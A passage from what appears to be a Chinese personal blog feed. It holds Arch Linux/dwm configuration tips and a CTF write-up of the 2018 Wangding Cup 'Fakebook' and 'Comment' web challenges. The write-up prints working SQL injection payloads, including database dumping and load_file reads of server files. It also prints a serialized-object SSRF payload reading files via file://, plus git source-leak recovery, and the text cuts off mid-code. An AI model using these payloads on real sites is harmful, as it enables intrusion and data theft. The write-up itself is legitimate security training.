        <content type="html"><![CDATA[<p>记录Archlinux使用Dwm窗口管理器的一些重要的设置和部分解决方案，当然大部分的东西都来自<a href="https://wiki.archlinux.org/">ArchWiki</a>。部分是个人经验，为了日后方便查阅，所以简单记录一下。</p><a id="more"></a><h2 id="0x01-java程序显示异常"><a href="#0x01-java程序显示异常" class="headerlink" title="0x01 java程序显示异常"></a>0x01 java程序显示异常</h2><p>参考：</p><p><a href="https://wiki.archlinux.org/index.php/Java">https://wiki.archlinux.org/index.php/Java</a></p><p><a href="https://wiki.archlinux.org/index.php/Java_Runtime_Environment_fonts">https://wiki.archlinux.org/index.php/Java_Runtime_Environment_fonts</a></p><h3 id="java程序启动异常"><a href="#java程序启动异常" class="headerlink" title="java程序启动异常"></a>java程序启动异常</h3><p>相信绝大部分使用<code>linux</code>的用户可能都遇到过，比如<code>burpsuite</code>字体发虚，特别在<code>dwm</code>窗口管理器中，大部分<code>java</code>程序，包括<a href="https://www.jetbrains.com/">JetBrains</a>的所有软件都无法正常开启，在我查阅了<code>archwiki</code>后，终于解决了这一大问题。</p><p>在<code>archlinux</code>可以使用<code>archlinux-java</code>命令随时切换不同<code>java</code>版本</p><p>在<code>dwm</code>中，他本来就是一个窗口管理器，但<code>JVM</code>需要你在不同的窗口管理器中才能解决在窗口管理器发生的<code>Java GUIs</code>渲染问题。</p><p>所以使用<code>suckless</code>官方给出的<a href="https://tools.suckless.org/x/wmname/">wmname</a>冒充另一个窗口管理器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmname LG3D</span><br></pre></td></tr></table></figure><p>必须在运行了这条命令后重启有问题的程序，也可以把此命令设为开机自启更加方便。</p><h3 id="java程序字体渲染"><a href="#java程序字体渲染" class="headerlink" title="java程序字体渲染"></a>java程序字体渲染</h3><p>启用抗锯齿显示，将以下内容添加到<code>/etc/environment</code>中:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_JAVA_OPTIONS=<span class="string">&#x27;-Dawt.useSystemAAFontSettings=lcd&#x27;</span></span><br></pre></td></tr></table></figure><p>使用<code>GTK</code>的显示风格，将下面的内容添加到<code>~/.bashrc</code>中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_JAVA_OPTIONS=<span class="string">&#x27;-Dswing.defaultlaf=com.sun.java.swing.plaf.gtk.GTKLookAndFeel&#x27;</span> </span><br></pre></td></tr></table></figure><p>即使通过<code>Java</code>选项强制执行了抗锯齿，得到的抗锯齿效果也可能不如本机应用程序。可以通过<code>OpenJDK</code>的一个补丁来弥补，<a href="https://wiki.archlinux.org/index.php/AUR">AUR</a>提供了这个补丁:</p><p>修补后的 <code>OpenJDK7</code>可用 <a href="https://aur.archlinux.org/packages/jre7-openjdk-infinality/">jre7-openjdk-infinality</a></p><p>修补后的 <code>OpenJDK8</code>可用 <a href="https://aur.archlinux.org/packages/jre8-openjdk-infinality/">jre8-openjdk-infinality</a></p><p><strong>字体修改:</strong></p><p>使用<code>Microsoft</code>的字体. 在<a href="https://wiki.archlinux.org/index.php/AUR">AUR</a>安装<a href="https://aur.archlinux.org/packages/ttf-ms-fonts/">ttf-ms-fonts</a></p><p>将以下内容添加到<code>/etc/environment</code>以启用这些字体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JAVA_FONTS=/usr/share/fonts/TTF</span><br></pre></td></tr></table></figure><p><strong>修复乱码 (For JRE8):</strong></p><p>将字体文件放在下面的目录下。如果目录不存在，则创建该目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/jvm/java-8-openjdk/jre/lib/fonts/fallback/</span><br></pre></td></tr></table></figure><p>ok! 做完这些步骤后，你的<code>archlinux</code>启动<code>java</code>程序应该会有一个很不错的显示效果，布局也正常了，看看我的<code>burpsuite</code>显示效果，很完美。</p><p><img src="https://oss.zjun.info/zjun.info/somesolutions-1.png" alt="somesolutions-1"></p><h2 id="0x02-导入系统证书"><a href="#0x02-导入系统证书" class="headerlink" title="0x02 导入系统证书"></a>0x02 导入系统证书</h2><p>参考：</p><p><a href="https://www.archlinux.org/news/ca-certificates-update/">https://www.archlinux.org/news/ca-certificates-update/</a></p><p>这一步很重要，在<code>archlinux</code>中最好的证书导入方式就是把证书直接导入系统当中，不论是<code>burpsuite</code>或是<code>xray</code>或是一些<code>vpn</code>证书，导入系统的效果最好，三条命令完成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo cp xxx.crt /etc/ssl/certs/</span><br><span class="line">sudo cp xxx.crt /etc/ca-certificates/trust-source/anchors/</span><br><span class="line">sudo trust extract-compat</span><br></pre></td></tr></table></figure><h2 id="0x03-可视化蓝牙配置"><a href="#0x03-可视化蓝牙配置" class="headerlink" title="0x03 可视化蓝牙配置"></a>0x03 可视化蓝牙配置</h2><p>参考：</p><p><a href="https://wiki.archlinux.org/index.php/Bluetooth">https://wiki.archlinux.org/index.php/Bluetooth</a></p><p>安装蓝牙、蓝牙音频及可视化管理工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yay -S bluez bluez-utils pulseaudio-bluetooth blueman</span><br></pre></td></tr></table></figure><p>在<code>/etc/pulse/system.pa</code> 增加下面内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load-module module-bluetooth-policy</span><br><span class="line">load-module module-bluetooth-discover</span><br></pre></td></tr></table></figure><p>启动蓝牙服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start bluetooth.service</span><br></pre></td></tr></table></figure><p>启动<code>blueman</code>管理工具，当然你可以把它设为开机自启：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blueman-applet &amp;</span><br></pre></td></tr></table></figure><h2 id="0x04-TIM解决方案"><a href="#0x04-TIM解决方案" class="headerlink" title="0x04 TIM解决方案"></a>0x04 TIM解决方案</h2><p>当然<code>archlinuxcn源</code>里有<code>qq-linux</code>,但是这个谁用谁知道,反正我不喜欢用,其次可以选择<code>deepin-qq</code>,可用<code>archlinuxcn源</code>的<code>deepin.com.qq.office</code>,但是该版本较旧,推荐<code>aur源</code>的<code>deepin-wine-tim</code>,直接下载编译,随时保持最新版,<code>deepin-qq</code>在非<code>gnome</code>环境下主要存在<code>3个</code>问题.</p><p><strong>其一:</strong></p><p><code>dwm</code>每次重启后<code>tim</code>都无法开启,修改<code>wine</code>版本可解决,将<code>/opt/deepinwine/apps/Deepin-TIM/run.sh</code>和<code>/opt/deepinwine/tools/run.sh</code>的<code>WINE_CMD</code>一项都修改为<code>wine</code>,这也可以解决使用<code>deepin-wine</code>时的字体显示问题.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WINE_CMD=<span class="string">&quot;wine&quot;</span></span><br></pre></td></tr></table></figure><p><strong>其二:</strong></p><p>需提前运行<code>gnome-settings-daemon</code>依赖,但是运行后会导致<code>gkt</code>主题遭到破坏,运行以下<code>两条</code>命令重新设置主题:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gsettings <span class="built_in">set</span> org.gnome.desktop.interface gtk-theme Adapta-Eta</span><br><span class="line">gsettings <span class="built_in">set</span> org.gnome.desktop.interface icon-theme Arc</span><br></pre></td></tr></table></figure><p>当然我都是开机自启的包括运行<code>gnome-settings-daemon</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup /usr/lib/gsd-xsettings &gt; /dev/null 2&gt;&amp;1 </span><br></pre></td></tr></table></figure><p><strong>其三:</strong></p><p><code>TIM</code>无法显示图片,包括用户头像等,原因在于<code>deepin-qq</code>走的是<code>ipv6</code>的线路,解决方案是禁用本机<code>ipv6</code>,但我不推荐,推荐使用代理,但是<code>tim</code>登录显示原因<code>linux</code>上设置不了,所以在<code>windows</code>上设置后将配置文件复制过来即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Documents\Tencent Files\All Users\TIM</span><br></pre></td></tr></table></figure><p>替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/Documents/Tencent Files/All Users/TIM</span><br></pre></td></tr></table></figure><h2 id="0x05-linux-网易云音乐无法输入中文"><a href="#0x05-linux-网易云音乐无法输入中文" class="headerlink" title="0x05 linux 网易云音乐无法输入中文"></a>0x05 linux 网易云音乐无法输入中文</h2><p><code>linux</code>上网易云音乐使用其自己的<code>qt</code>框架,无法共用系统环境配置,所以单独为其配置一下环境变量即可,修改<code>/opt/netease/netease-cloud-music/netease-cloud-music.bash</code></p><p>先注释三行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#export LD_LIBRARY_PATH=&quot;$&#123;HERE&#125;&quot;/libs</span></span><br><span class="line"><span class="comment">#export QT_PLUGIN_PATH=&quot;$&#123;HERE&#125;&quot;/plugins </span></span><br><span class="line"><span class="comment">#export QT_QPA_PLATFORM_PLUGIN_PATH=&quot;$&#123;HERE&#125;&quot;/plugins/platforms</span></span><br></pre></td></tr></table></figure><p>再添加两行,完美解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=/usr/lib</span><br><span class="line"><span class="built_in">export</span> XDG_CURRENT_DESKTOP=DDE</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Archlinux </tag>
            
            <tag> Dwm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记2018年网鼎杯的两个Web</title>
      <link href="2020/wangdingcup-2018-web.html"/>
      <url>2020/wangdingcup-2018-web.html</url>
      
        <content type="html"><![CDATA[<p>今年的网鼎杯也快要来了，就想找上一届的ctf题目来看看，正好发现<a href="https://buuoj.cn/">buuctf</a>上面有三个<code>web</code>(Fakebook，Comment，Unfinish)，但最后一题不知道是我姿势有问题还是环境问题，总之只复现了两个web。</p><a id="more"></a><h2 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a>Fakebook</h2><p><font color=red><strong>考点：</strong></font></p><ul><li>php代码审计</li><li>sql注入</li><li>php反序列化</li><li>ssrf</li></ul><p>存在有<code>robots</code>文件，访问之得到源码地址<code>/user.php.bak</code>，于是下载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个<code>UserInfo</code>类，前面都是一些传参，主要的点在<code>get</code>方法中，其次<code>isValidBlog</code>方法对用户输入进行了过滤。</p><p>看<code>get</code>方法，先初始化<code>curl</code>会话，设置一个<code>url</code>链接，然后第二个<code>curl_setopt</code>里面是<code>1</code>，表示如果成功只将结果返回，不输出任何内容。如果失败返回<code>FALSE</code>，随即运行<code>curl</code>，并返回执行结果。<code>$httpCode</code>用来获取<code>http</code>状态码。</p><p>分析了定义的<code>get</code>方法后，我们再来简单了解下<code>curl</code>的用法及特性，而且后面注册输入博客<code>url</code>时是会加载的，综合这些信息，可容易得出由于对<code>curl</code>控制不严导致存在<code>ssrf</code>漏洞，<code>curl</code>支持多种协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp</span><br></pre></td></tr></table></figure><p>试想这里我们是不是可以利用<code>curl</code>支持的<code>file</code>协议来构造读取服务器内文件，但是由于<code>isValidBlog</code>方法的存在导致我们不能直接在注册处读取文件。</p><p>回到题目，先随意注册一个用户登录进去，可以选一些比如<code>baidu</code>之类的网址，会明显看到博客地址有被加载</p><p><img src="https://oss.zjun.info/zjun.info/18wdb-1.png" alt="18wdb-1"></p><p>注意<code>url</code>的格式，可能存在注入</p><p><code>/view.php?no=1</code></p><p>查字段数：<code>4</code></p><p><code>/view.php?no=1 order by 4</code></p><p>联合查询显示<code>no hack</code>，利用注释符轻松绕过</p><p><code>/view.php?no=-1 union/**/select 1,2,3,4#</code></p><p>查库名为：<code>fakebook</code></p><p><code>/view.php?no=-1 union/**/select 1,database(),3,4#</code></p><p>查表名为：<code>users</code></p><p><code>/view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;#</code></p><p>查列名：<code>no</code>,<code>username</code>,<code>passwd</code>,<code>data</code></p><p><code>/view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=&#39;fakebook&#39; and table_name=&#39;users&#39;#</code></p><p>查出其中所有数据：</p><p><code>/view.php?no=-1 union/**/select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users#</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1zjundad271d633ebcf4f364ab8976fc5ea5035360d5420fc644a41cadc1b6098c98b901cf8c8609207dd774f2996c542115a20e36c9e06d0ec0f97dcedec30d59db6O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;zjun&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:21:&quot;https:&#x2F;&#x2F;www.zjun.info&quot;;&#125;</span><br></pre></td></tr></table></figure><p><code>data</code>列存储的数据是序列化的字符串，可以利用前面的<code>ssrf</code>配合<code>file</code>协议构造<code>paylod</code>读取<code>flag</code>文件</p><p>先构造<code>pop</code>链（其实不构造也行，直接把上面的<code>博客地址</code>改成<code>flag路径</code>，再改下<code>字符长度</code>传过去即可）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class UserInfo&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new UserInfo();</span><br><span class="line">$a-&gt;name&#x3D;&quot;zjun&quot;;</span><br><span class="line">$a-&gt;blog&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>php</code>执行一下输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3：&#123;s:4:&quot;name&quot;;s:4:&quot;zjun&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>最终<code>payload</code>：</p><p><code>view.php?no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;zjun&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;#</code></p><p>查看源码得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text&#x2F;html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s5NGQ4OTk2OS04NTQyLTQwZGEtYjdiZS1kODMzNmM3NWVjMWR9IjsNCmV4aXQoMCk7DQo&#x3D;</span><br></pre></td></tr></table></figure><p><code>base64</code>解码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s5NGQ4OTk2OS04NTQyLTQwZGEtYjdiZS1kODMzNmM3NWVjMWR9IjsNCmV4aXQoMCk7DQo&#x3D;&#39; | base64 -d</span><br></pre></td></tr></table></figure><p>得<code>flag</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag &#x3D; &quot;flag&#123;94d89969-8542-40da-b7be-d8336c75ec1d&#125;&quot;;</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure><p>除此之外还存在一<font color=red>非预期</font>解法，由于有较高权限以及可用<code>load_file()</code>函数，所以可以直接构造<code>payload</code>：</p><p><code>/view.php?no=0 union/**/select 1,load_file(&#39;/var/www/html/flag.php&#39;),3,4#</code></p><p>然后查看源码直接可得<code>flag</code></p><h2 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h2><p><font color=red><strong>考点：</strong></font></p><ul><li>git用法</li><li>php代码审计</li><li>二次注入</li><li>linux bash杂点</li></ul><p>来看看题，一个留言板，发帖跳转登录</p><p><img src="https://oss.zjun.info/zjun.info/18wdb-2.png" alt="18wdb-2"></p><p>帐号给出了，密码简单爆破一下，得<code>zhangwei666</code>，然后又来到发帖页面</p><p><img src="https://oss.zjun.info/zjun.info/18wdb-3.png" alt="18wdb-3"></p><p>控制台发现<code>程序员GIT写一半跑路了,都没来得及Commit</code>字样，由<code>git</code>和<code>commit</code>判断可能存在<code>git</code>源码泄漏以及与<code>git</code>状态相关的东西，所以利用<a href="https://github.com/WangYihang/GitHacker">GitHacker</a>工具，可连同<code>.git</code>目录一起下载下来。</p><p>查看<code>git</code>操作记录</p><p><code>git log --reflog</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">commit e5b2a2443c2b6d395d06960123142bc91123148c (refs&#x2F;stash)</span><br><span class="line">Merge: bfbdf21 5556e3a</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:51:17 2018 +0800</span><br><span class="line"></span><br><span class="line">    WIP on master: bfbdf21 add write_do.php</span><br><span class="line"></span><br><span class="line">commit 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:51:17 2018 +0800</span><br><span class="line"></span><br><span class="line">    index on master: bfbdf21 add write_do.php</span><br><span class="line"></span><br><span class="line">commit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -&gt; master)</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:47:29 2018 +0800</span><br><span class="line"></span><br><span class="line">    add write_do.php</span><br></pre></td></tr></table></figure><p>把第一行版本源码恢复出来</p><p><code>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</code></p><p>得到完整源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计代码发现当<code>get</code>传入的<code>do=write</code>时，利用<code>addslashes()</code>函数对<code>post</code>传入的变量进行转义，在每个双引号<code>&quot;</code>前添加反斜杠</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 